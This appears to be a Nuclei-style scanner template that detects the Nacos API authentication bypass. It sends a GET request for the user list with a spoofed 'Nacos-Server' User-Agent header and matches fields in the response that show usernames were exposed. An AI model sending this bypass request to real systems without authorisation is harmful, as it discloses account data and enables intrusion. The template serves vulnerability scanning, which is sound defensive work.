id: poc-yaml-nacos-api-auth-bypass
info:
  name: Nacos API Authentication Bypass Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: auth-bypass

http:
  - method: GET
    path:
      - "/nacos/v1/auth/users?pageNo=1&pageSize=9"
    headers:
      User-Agent: Nacos-Server
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "pageItems"
        part: body
      - type: word
        words:
          - "pagesAvailable"
        part: body
      - type: word
        words:
          - "username"
        part: body
